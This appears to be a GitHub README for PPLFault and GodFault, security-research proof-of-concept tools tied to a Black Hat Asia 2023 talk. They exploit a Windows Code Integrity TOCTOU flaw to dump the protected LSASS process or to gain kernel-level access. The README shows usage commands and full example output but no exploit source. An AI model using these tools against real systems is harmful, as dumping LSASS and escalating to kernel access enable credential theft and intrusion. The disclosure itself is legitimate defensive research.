# PPLFault

By [Gabriel Landau](https://twitter.com/GabrielLandau) at [Elastic Security](https://www.elastic.co/security-labs/).

From [PPLdump Is Dead. Long Live PPLdump!](https://www.blackhat.com/asia-23/briefings/schedule/#ppldump-is-dead-long-live-ppldump-31052) presented at [Black Hat Asia 2023](https://www.blackhat.com/asia-23).

[![PPLdump Is Dead. Long Live PPLdump!](http://img.youtube.com/vi/5xteW8Tm410/0.jpg)](http://www.youtube.com/watch?v=5xteW8Tm410 "PPLdump Is Dead. Long Live PPLdump!")

## PPLFault

Exploits a TOCTOU in Windows Code Integrity to achieve arbitrary code execution as WinTcb-Light then dump a specified process.  For more details on the exploit, see my [slides](http://i.blackhat.com/Asia-23/AS-23-Landau-PPLdump-Is-Dead-Long-Live-PPLdump.pdf) and/or [talk](https://x.com/GabrielLandau/status/1707773387731272085).

### Example Output

```
PS C:\Users\user\Desktop> cmd /c ver

Microsoft Windows [Version 10.0.25346.1001]
PS C:\Users\user\Desktop> tasklist | findstr lsass
lsass.exe                      992 Services                   0     76,620 K
PS C:\Users\user\Desktop> (Get-NtProcess -Access QueryLimitedInformation -Pid 992).Protection

Type           Signer
----           ------
ProtectedLight Lsa


PS C:\Users\user\Desktop> dir *.dmp
PS C:\Users\user\Desktop> .\PPLFault.exe -v 992 lsass.dmp
 [+] No cleanup necessary.  Backup does not exist.
 [+] GetShellcode: 528 bytes of shellcode written over DLL entrypoint
 [+] Benign: C:\Windows\System32\EventAggregation.dll.bak
 [+] Payload: C:\PPLFaultTemp\PPLFaultPayload.dll
 [+] Placeholder: C:\PPLFaultTemp\EventAggregationPH.dll
 [+] Acquired exclusive oplock to file: C:\Windows\System32\devobj.dll
 [+] Ready.  Spawning WinTcb.
 [+] SpawnPPL: Waiting for child process to finish.
 [+] FetchDataCallback called.
 [+] Hydrating 90112 bytes at offset 0
 [+] Switching to payload
 [+] Emptying system working set
 [+] Working set purged
 [+] Give the memory manager a moment to think
 [+] Hydrating 90112 PAYLOAD bytes at offset 0
 [+] Dump saved to: lsass.dmp
 [+] Dump is 74.9 MB
 [+] Operation took 937 ms
PS C:\Users\user\Desktop> dir *.dmp


    Directory: C:\Users\user\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          5/1/2023  11:18 AM       78581973 lsass.dmp
```

## GodFault

Exploits the same TOCTOU as PPLFault.  However instead of dumping a process, it migrates to CSRSS and exploits a vulnerability in `win32k!NtUserHardErrorControlCall` from [ANGRYORCHARD](https://github.com/gabriellandau/ANGRYORCHARD/blob/0a4720f7e07e86a9ac2783411b81efac14938e26/Exploit.c#L69-L81) to decrement `KTHREAD.PreviousMode` from `UserMode` (1) to `KernelMode` (0).  It proves "God Mode" access by opening `\Device\PhysicalMemory`, normally inaccessible from `UserMode`, as `SECTION_ALL_ACCESS`.

### Example Output

```
C:\Users\user\Desktop>GodFault.exe -v
 [?] Server does not appear to be running.  Attempting to install it...
 [+] No cleanup necessary.  Backup does not exist.
 [+] GetShellcode: 2304 bytes of shellcode written over DLL entrypoint
 [+] CSRSS PID is 772
 [+] Benign: C:\Windows\System32\EventAggregation.dll.bak
 [+] Payload: C:\GodFaultTemp\GodFaultPayload.dll
 [+] Placeholder: C:\GodFaultTemp\EventAggregationPH.dll
 [+] Acquired exclusive oplock to file: C:\Windows\System32\devobj.dll
 [+] Testing initial ability to acquire PROCESS_ALL_ACCESS to System: Failure
 [+] Ready.  Spawning WinTcb.
 [+] SpawnPPL: Waiting for child process to finish.
 [+] FetchDataCallback called.
 [+] Hydrating 90112 bytes at offset 0
 [+] Switching to payload
 [+] Emptying system working set
 [+] Working set purged
 [+] Give the memory manager a moment to think
 [+] Hydrating 90112 PAYLOAD bytes at offset 0
 [+] Thread 6248 (KTHREAD FFFFA283B0A62080) has been blessed
 [+] Testing post-exploit ability to acquire PROCESS_ALL_ACCESS to System: Success
 [+] Opened \Device\PhysicalMemory.  Handle is 0x1b4
 [+] Opened System process as PROCESS_ALL_ACCESS.  Handle is 0x1c0
 [+] Press any key to continue...
 [+] No cleanup necessary.  Backup does not exist.
```

## Python
PoC that achieves arbitrary code execution as WinTcb-Light without the CloudFilter API.  See [python/README.md](python/README.md).

## Tested Platforms

|  | Windows 11 22H2 22621.1702 (May 2023) | Windows 11 Insider Canary 25346.1001 (April 2023) |
| - | - | - |
| PPLFault | ✔️ | ✔️ |
| GodFault | ✔️ | ❌ Insider PreviousMode mitigation [bugchecks](https://twitter.com/GabrielLandau/status/1597001955909697536?s=20) |

# License

PPLFault is covered by the [ELv2 license](LICENSE.txt).  It uses [phnt](https://github.com/winsiderss/systeminformer/tree/25846070780183848dc8d8f335a54fa6e636e281/phnt) from SystemInformer under the [MIT license](phnt/LICENSE.txt).

# Credits
Inspired by [PPLdump](https://github.com/itm4n/PPLdump) by [Clément Labro](https://infosec.exchange/@itm4n), which Microsoft [patched](https://itm4n.github.io/the-end-of-ppldump/) in July 2022.

[ANGRYORCHARD](https://github.com/gabriellandau/ANGRYORCHARD) was created by [Austin Hudson](https://twitter.com/ilove2pwn_), who released it when Microsoft patched PPLdump.
